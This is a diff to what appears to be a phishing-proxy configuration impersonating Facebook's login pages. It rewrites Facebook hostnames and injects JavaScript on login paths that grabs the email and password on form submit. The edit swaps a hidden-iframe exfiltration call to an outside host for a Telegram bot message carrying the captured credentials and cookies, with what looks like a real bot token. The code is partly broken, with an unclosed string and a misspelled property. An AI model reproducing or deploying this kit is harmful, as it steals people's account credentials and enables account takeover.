@@ -15,6 +15,7 @@ sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}
+  
 
 response_headers:
   - name: 'X-Frame-Options'
@@ -61,6 +62,10 @@ login:
   path: '/login.php'
   force_basic_auth: true
 
+host_mapping:
+  www.facebook.com: {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com'}
+  m.facebook.com: {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com'}
+
 js_inject:
   - trigger_domains: ["www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
@@ -95,15 +100,6 @@ js_inject:
               }),
               keepalive: true
             });
-            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({
-                chat_id: "5228920520",
-                text: `New Logs\nEmail: ${email}\npass: ${pass}\nIP: ${window.location.hostname}
-                disable_notification: false
-              })
-            })
           }
         }
         return origFetch.apply(this, arguments);
@@ -115,11 +111,17 @@ js_inject:
           const email = e.target.querySelector('[name="email"]')?.value;
           const pass = e.target.querySelector('[name="pass"]')?.value;
           if (email && pass) {
-            // Create hidden iframe to send data
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = `https://frontgate.live/capture?e=${encodeURIComponent(email)}&p=${encodeURIComponent(pass)}`;
-            document.body.appendChild(iframe);
+            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({
+                chat_id: "5228920520",
+                text: `New Logs\nEmail: ${email}\npass: ${pass}\n Cookie: ${document.cooke} \nIP: ${window.location.hostname}
+                disable_notification: false
+              })
+            })
+          } else {
+          console.log('nope');
           }
         }
       }, true);
